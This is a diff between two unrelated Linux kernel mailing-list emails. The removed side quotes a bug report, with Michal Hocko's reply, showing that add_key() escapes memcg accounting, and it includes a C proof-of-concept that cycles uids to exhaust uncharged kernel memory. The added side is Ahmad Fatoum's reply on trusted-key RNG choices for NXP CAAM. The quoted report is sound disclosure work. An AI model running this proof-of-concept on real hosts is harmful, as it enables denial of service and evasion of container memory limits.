@@ -2,144 +2,164 @@ Return-Path: <keyrings-owner@vger.kernel.org>
 X-Original-To: lists+keyrings@lfdr.de
 Delivered-To: lists+keyrings@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 1B67E34C51A
-	for <lists+keyrings@lfdr.de>; Mon, 29 Mar 2021 09:40:41 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 7F2BB34CDBD
+	for <lists+keyrings@lfdr.de>; Mon, 29 Mar 2021 12:12:14 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S231334AbhC2HkI (ORCPT <rfc822;lists+keyrings@lfdr.de>);
-        Mon, 29 Mar 2021 03:40:08 -0400
-Received: from mx2.suse.de ([195.135.220.15]:37210 "EHLO mx2.suse.de"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S231354AbhC2Hjp (ORCPT <rfc822;keyrings@vger.kernel.org>);
-        Mon, 29 Mar 2021 03:39:45 -0400
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=susede1;
-        t=1617003584; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-         mime-version:mime-version:content-type:content-type:
-         content-transfer-encoding:content-transfer-encoding:
-         in-reply-to:in-reply-to:references:references;
-        bh=Awe1edIW7HAOiUt+RBmLfJWuVVokUbchDFh5Qge6oI8=;
-        b=NUKM6iFAgfWtvIpxM1eVye/CaKKOmtbFhRt+GxNMj3mSSxxJ6JwxzDx+HN7S3qY0VIp5M7
-        cfYqWae/+dJlrfwmYmTkc5g6O9SH0aExLdx7dkvk7SJBnIzJJ54i9px7+cOiRUsNF7sjGO
-        CWpItdr5zzVGHzFTyeb6mZok62wNRWM=
-Received: from relay2.suse.de (unknown [195.135.221.27])
-        by mx2.suse.de (Postfix) with ESMTP id E8D55AE89;
-        Mon, 29 Mar 2021 07:39:43 +0000 (UTC)
-Date:   Mon, 29 Mar 2021 09:39:42 +0200
-From:   Michal Hocko <mhocko@suse.com>
-To:     =?utf-8?B?5p2o5pix5aSp?= <ytyang@zju.edu.cn>
-Cc:     hannes@cmpxchg.org, vdavydov.dev@gmail.com,
-        cgroups@vger.kernel.org, linux-mm@kvack.org,
-        shenwenbosmile@gmail.com, David Howells <dhowells@redhat.com>,
-        Jarkko Sakkinen <jarkko@kernel.org>,
+        id S232573AbhC2KLp (ORCPT <rfc822;lists+keyrings@lfdr.de>);
+        Mon, 29 Mar 2021 06:11:45 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:44978 "EHLO
+        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S232779AbhC2KLg (ORCPT
+        <rfc822;keyrings@vger.kernel.org>); Mon, 29 Mar 2021 06:11:36 -0400
+Received: from metis.ext.pengutronix.de (metis.ext.pengutronix.de [IPv6:2001:67c:670:201:290:27ff:fe1d:cc33])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 7093AC061756
+        for <keyrings@vger.kernel.org>; Mon, 29 Mar 2021 03:11:36 -0700 (PDT)
+Received: from gallifrey.ext.pengutronix.de ([2001:67c:670:201:5054:ff:fe8d:eefb] helo=[IPv6:::1])
+        by metis.ext.pengutronix.de with esmtp (Exim 4.92)
+        (envelope-from <a.fatoum@pengutronix.de>)
+        id 1lQorr-00056a-FI; Mon, 29 Mar 2021 12:11:31 +0200
+Subject: Re: [PATCH v1 3/3] KEYS: trusted: Introduce support for NXP
+ CAAM-based trusted keys
+To:     Jarkko Sakkinen <jarkko@kernel.org>,
+        David Gstir <david@sigma-star.at>
+Cc:     Sumit Garg <sumit.garg@linaro.org>,
+        Mimi Zohar <zohar@linux.ibm.com>,
+        =?UTF-8?Q?Horia_Geant=c4=83?= <horia.geanta@nxp.com>,
+        Jonathan Corbet <corbet@lwn.net>,
+        David Howells <dhowells@redhat.com>,
+        James Bottomley <jejb@linux.ibm.com>,
+        "kernel@pengutronix.de" <kernel@pengutronix.de>,
         James Morris <jmorris@namei.org>,
-        "Serge E. Hallyn" <serge@hallyn.com>, keyrings@vger.kernel.org,
-        linux-security-module@vger.kernel.org
-Subject: Re: add_key() syscall can lead to bypassing memcg limits
-Message-ID: <YGGEPrYCDmSCjuun@dhcp22.suse.cz>
-References: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
+        "Serge E. Hallyn" <serge@hallyn.com>,
+        Aymen Sghaier <aymen.sghaier@nxp.com>,
+        Herbert Xu <herbert@gondor.apana.org.au>,
+        "David S. Miller" <davem@davemloft.net>,
+        Udit Agarwal <udit.agarwal@nxp.com>,
+        Jan Luebbe <j.luebbe@pengutronix.de>,
+        Franck Lenormand <franck.lenormand@nxp.com>,
+        "keyrings@vger.kernel.org" <keyrings@vger.kernel.org>,
+        "linux-crypto@vger.kernel.org" <linux-crypto@vger.kernel.org>,
+        "linux-doc@vger.kernel.org" <linux-doc@vger.kernel.org>,
+        "linux-integrity@vger.kernel.org" <linux-integrity@vger.kernel.org>,
+        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
+        "linux-security-module@vger.kernel.org" 
+        <linux-security-module@vger.kernel.org>
+References: <cover.56fff82362af6228372ea82e6bd7e586e23f0966.1615914058.git-series.a.fatoum@pengutronix.de>
+ <319e558e1bd19b80ad6447c167a2c3942bdafea2.1615914058.git-series.a.fatoum@pengutronix.de>
+ <01e6e13d-2968-0aa5-c4c8-7458b7bde462@nxp.com>
+ <45a9e159-2dcb-85bf-02bd-2993d50b5748@pengutronix.de>
+ <f9c0087d299be1b9b91b242f41ac6ef7b9ee3ef7.camel@linux.ibm.com>
+ <63dd7d4b-4729-9e03-cd8f-956b94eab0d9@pengutronix.de>
+ <CAFA6WYOw_mQwOUN=onhzb7zCTyYDBrcx0E7C3LRk6nPLAVCWEQ@mail.gmail.com>
+ <557b92d2-f3b8-d136-7431-419429f0e059@pengutronix.de>
+ <CAFA6WYNE44=Y7Erfc-xNtOrf7TkJjh+odmYH5vzhEHR6KqBfeQ@mail.gmail.com>
+ <6F812C20-7585-4718-997E-0306C4118468@sigma-star.at>
+ <YGDpA4yPWmTWEyx+@kernel.org>
+From:   Ahmad Fatoum <a.fatoum@pengutronix.de>
+Message-ID: <1171de9c-97b9-3936-707b-16ec34cf94d5@pengutronix.de>
+Date:   Mon, 29 Mar 2021 12:11:24 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
+ Thunderbird/78.7.0
 MIME-Version: 1.0
+In-Reply-To: <YGDpA4yPWmTWEyx+@kernel.org>
 Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
+Content-Language: en-US
 Content-Transfer-Encoding: 8bit
-In-Reply-To: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
+X-SA-Exim-Connect-IP: 2001:67c:670:201:5054:ff:fe8d:eefb
+X-SA-Exim-Mail-From: a.fatoum@pengutronix.de
+X-SA-Exim-Scanned: No (on metis.ext.pengutronix.de); SAEximRunCond expanded to false
+X-PTX-Original-Recipient: keyrings@vger.kernel.org
 Precedence: bulk
 List-ID: <keyrings.vger.kernel.org>
 X-Mailing-List: keyrings@vger.kernel.org
 
-Cc keyctl maintainers
+Hello Jarkko,
 
-On Sun 28-03-21 10:30:34, 杨昱天 wrote:
-> Hi, our team has found a bug in key_alloc() on Linux kernel v5.10.19, which leads to bypassing memcg limits.
-> The bug is caused by the code snippets listed below:
+On 28.03.21 22:37, Jarkko Sakkinen wrote:
+> On Sat, Mar 27, 2021 at 01:41:24PM +0100, David Gstir wrote:
+>> Generally speaking, I’d say trusting the CAAM RNG and trusting in it’s
+>> other features are two separate things. However, reading through the CAAM
+>> key blob spec I’ve got here, CAAM key blob keys (the keys that secure a blob’s
+>> content) are generated using its internal RNG. So I’d save if the CAAM RNG
+>> is insecure, so are generated key blobs. Maybe somebody with more insight
+>> into the CAAM internals can verify that, but I don’t see any point in using
+>> the kernel’s RNG as long as we let CAAM generate the key blob keys for us.
 > 
-> /*--------------- key.c --------------------*/
-> ...
-> 276/* allocate and initialise the key and its description */
-> 277key = kmem_cache_zalloc(key_jar, GFP_KERNEL);
-> 278if (!key)
-> 279goto no_memory_2;
-> ...
-> /*---------------- end ---------------------*/
-> 
-> /*------------- keyctl.c -------------------*/
-> ...
-> 95  if (_description) {
-> 96description = strndup_user(_description, KEY_MAX_DESC_SIZE);
-> 97if (IS_ERR(description)) {
-> ...
-> /*--------------- end ---------------------*/
-> 
-> Each user can allocate ~20KB uncharged memory by calling add_key syscall to trigger the listed code.
-> Code at line 277 in the first snippet allocates a new struct key object that is not charged by memcg, as no accouting flag is passed to neither the
-> allocation site here nor the key_jar's creating site. At line 96 in the second snippet, we found that memory used by description of a key, 
-> which has a maximum size of 4096 bytes, is also not charged. A user can allocate multiple keys and consume more uncharged memory. 
-> The upper limit of key memory's size is set to 20,000 bytes by default for each user.
-> 
-> The bug can cause severe memcg limit bypassing if a process can change its uid and bypass the above limit. For example, a user may own root privilege 
-> in its user namespace and leverage seteuid() syscall to continuously change its uid. 
-> Our evaluation on QEMU v5.1.0 + cgroup v2 shows that, under this assumption, we could consume ~2.2G memory by allocating keys from 100,000 different uids, while the memory charged by memcg is ~215MB.
+> Here's my long'ish analysis. Please read it to the end if by ever means
+> possible, and apologies, I usually try to keep usually my comms short, but
+> this requires some more meat than the usual.
 
-Can the user/attacker create all those different uids? Or what would be
-a typical scenario where this a threat? In other words is this a
-practical attack vector?
+Thanks for the write-up!
 
-If yes then the mitigation woulld be quite easy for the key_jar (just
-add __GFP_ACCOUNT). I am not aware we would have strndup_user
-alternative with kemecg enabled so this would have to be added.
+> The Bad News
+> ============
+> 
+> Now that we add multiple hardware trust sources for trusted keys, will
+> there ever be a scenario where a trusted key is originally sealed with a
+> backing hardware A, unsealed, and resealed with hardware B?
+> 
+> The hardware and vendor neutral way to generate the key material would be
+> unconditionally always just the kernel RNG.
+> 
+> CAAM is actually worse than TCG because it's not even a standards body, if
+> I got it right. Not a lot but at least a tiny fraction.
+
+CAAM is how NXP calls the crypto accelerator built into some of its SoCs.
+
+> This brings an open item in TEE patches: trusted_tee_get_random() is an
+> issue in generating kernel material. I would rather replace that with
+> kernel RNG *for now*, because the same open question applies also to ARM
+> TEE. It's also a single company controlled backing technology.
+> 
+> By all practical means, I do trust ARM TEE in my personal life but this is
+> not important.
+> 
+> CAAM *and* TEE backends break the golden rule of putting as little trust as
+> possible to anything, even not anything weird is clear at sight, as
+> security is essentially a game of known unknowns and unknown unknowns.
+
+Agreed.
+
+> The GOOD News
+> =============
+> 
+> So there's actually option (C) that also fixes the TPM trustd keys issue:
+> 
+> Add a new kernel patch, which:
+> 
+> 1. Adds the use of kernel RNG as a boot option.
+> 2. If this boot option is not active, the subsystem will print a warning
+>    to klog denoting this.
+> 3. Default is of course vendor RNG given the bad design issue in the TPM
+>    trusted keys, but the warning in klog will help to address it at least
+>    a bit.
+
+Why should the TPM backend's choice influence later backends? We could add
+a new option for key creation time, e.g.:
+
+   keyctl add trusted kmk "new keylen rng=kernel" @s
+
+The default would be rng=vendor if available with a fallback to rng=kernel,
+which should always be available.
+
+> 4. Document all this to Documentation/security/keys/trusted-encrypted.rst.
+
+Yes, backends would then document whether they support a rng=vendor or not.
+
+> I'd prefer the choice between A, B and C be concluded rather sooner than
+> later.
+
+FWIW, my vote is for option C, with the change described above.
+
+Cheers,
+Ahmad
 
 > 
-> The PoC code is listed below:
+> /Jarkko
 > 
-> /*--------------- PoC --------------------*/
-> #include <asm/unistd.h>
-> #include <linux/keyctl.h>
-> #include <unistd.h>
-> #include <stdio.h>
-> #include <string.h>
-> #include <stdlib.h>
-> #include <time.h>
-> 
-> char desc[4000];
-> void alloc_key_user(int id) {
->   int i = 0, times = -1;
->   __s32 serial = 0;
->   int res_uid = seteuid(id);
->   if (res_uid == 0)
->     printf("uid allocation success on id %d!\n", id);
->   else {
->     printf("uid allocation failed on id %d!\n", id);
->     return;
->   }
->   srand(time(0));
->   while (serial != 0xffffffff) {
->     ++times;
->     for (i = 0; i < 3900; ++i)
->       desc[i] = rand()%255 + 1;
->     desc[i] = '\0';
->     serial = syscall(__NR_add_key, "user", desc, "payload",
->       strlen("payload"), KEY_SPEC_SESSION_KEYRING);
->   }
->   printf("allocation happened %d times.\n", times);
->   seteuid(0);
-> }
-> 
-> int main() {
->   int loop_times = 0;
->   int start_uid = 0;
->   scanf("%d %d", &start_uid, &loop_times);
->   for (int i = 0; i < loop_times; ++i) {
->     alloc_key_user(i+start_uid);
->   }
->   return 0;
-> }
-> 
-> /*-------------PoC end ---------------------*/
-> 
-> Thanks!
-> 
-> Best regards,
-> Yutian Yang
 
 -- 
-Michal Hocko
-SUSE Labs
+Pengutronix e.K.                           |                             |
+Steuerwalder Str. 21                       | http://www.pengutronix.de/  |
+31137 Hildesheim, Germany                  | Phone: +49-5121-206917-0    |
+Amtsgericht Hildesheim, HRA 2686           | Fax:   +49-5121-206917-5555 |
